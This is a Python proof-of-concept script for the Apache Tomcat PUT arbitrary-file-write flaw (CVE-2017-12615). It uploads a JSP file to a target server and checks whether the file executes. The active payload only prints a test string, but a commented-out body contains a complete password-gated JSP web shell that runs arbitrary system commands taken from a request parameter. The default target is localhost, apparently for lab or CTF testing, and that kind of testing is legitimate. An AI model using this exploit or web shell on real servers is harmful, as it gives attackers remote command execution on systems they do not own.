'''
http://wooyun.jozxing.cc/static/bugs/wooyun-2015-0107097.html
https://mp.weixin.qq.com/s?__biz=MzI1NDg4MTIxMw==&mid=2247483659&idx=1&sn=c23b3a3b3b43d70999bdbe644e79f7e5
https://mp.weixin.qq.com/s?__biz=MzU3ODAyMjg4OQ==&mid=2247483805&idx=1&sn=503a3e29165d57d3c20ced671761bb5e
'''

import requests
import uuid
from urllib.parse import urlparse

def poc(url):
    uu = uuid.uuid4()
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
        'Connection': 'close',
        'Upgrade-Insecure-Requests': '1',
    }

    # body = '''<%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%><%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp
    # +"\\n");}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString();}%><%if("ske".equals(request.getParameter("pwd"))&&!"".equals(request.getParameter("cmd"))){out.println("<pre>"+excuteCmd(request.getParameter("cmd"))+"</pre>");}else{out.println(":-)");}%>'''
    body = '''<%out.print("test");%>'''
    url_parse = urlparse(url)
    print(url_parse)
    url = r'http://' + url if url_parse.scheme == '' else url
    put_url = r'{}/{}.jsp/'.format(url,uu)
    print(url, put_url)
    try:
        res = requests.put(put_url,data=body,headers=headers)
        code = res.status_code
        if code == 201:
            print('[+]access : {}'.format(put_url[:-1]))
            access_url = put_url[:-1]
            whoami = requests.get(access_url).text
            if r"test" in whoami:
                print("[+]存在Tomcat PUT方法任意写文件漏洞（CVE-2017-12615）漏洞...(高危)\tpayload: " + access_url)
                return True
        else:
            return False
    except Exception as e:
        print("[-] " + __file__ + "====>连接超时", "cyan")
        return False


if __name__ == '__main__':
    # url = "http://node3.buuoj.cn:29118"
    url = "http://127.0.0.1:8080"
    poc(url)
